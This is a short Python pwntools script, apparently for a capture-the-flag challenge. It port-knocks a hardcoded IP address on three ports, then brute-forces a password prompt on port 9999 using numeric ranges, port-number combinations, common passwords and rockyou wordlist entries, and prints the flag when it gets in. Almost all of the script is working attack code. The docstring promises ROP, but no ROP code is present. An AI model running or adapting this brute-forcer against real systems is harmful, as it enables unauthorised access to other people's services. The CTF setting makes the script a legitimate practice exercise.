#!/usr/bin/env python3
"""
Ultra fast - try wordlist + ROP simultaneously
"""

from pwn import *
import threading
import time

context.log_level = 'error'

target_ip = "13.206.58.35"
found = False

def knock():
    for p in [9000, 2600, 1337]:
        try:
            s = socket.socket()
            s.settimeout(0.2)
            s.connect((target_ip, p))
            s.close()
        except:
            pass
    time.sleep(0.4)

def test(pwd):
    global found
    if found:
        return
    try:
        knock()
        c = remote(target_ip, 9999)
        c.recvuntil(b"password:", timeout=1)
        c.sendline(pwd if isinstance(pwd, bytes) else pwd.encode())
        r = c.recvall(timeout=0.8)
        c.close()
        
        if b"kaal{" in r.lower() or (len(r) > 100 and b"denied" not in r.lower()):
            found = True
            print(f"\n[!!!] FLAG: {r.decode('utf-8', errors='ignore')}")
            print(f"Password: {pwd}")
            return True
    except:
        pass
    return False

# Rockyou top 1000 + CTF common
words = open("rockyou.txt", "r", errors="ignore").readlines()[:1000] if os.path.exists("rockyou.txt") else []

passwords = [
    # Numbers
    *[str(i) for i in range(1, 10000, 100)],
    # Combinations
    *[f"{a}{b}{c}" for a in [9000, 2600, 1337, 9001] for b in [9000, 2600, 1337] for c in [9000, 2600, 1337]],
    # Common
    "password", "admin", "root", "123456", "qwerty",
    "KAAL", "kaal", "sector7", "SECTOR7",
] + [w.strip() for w in words]

print(f"[*] Testing {len(passwords)} passwords...")

for pwd in passwords[:500]:
    if test(pwd):
        exit(0)
    
if not found:
    print("[*] No flag found")
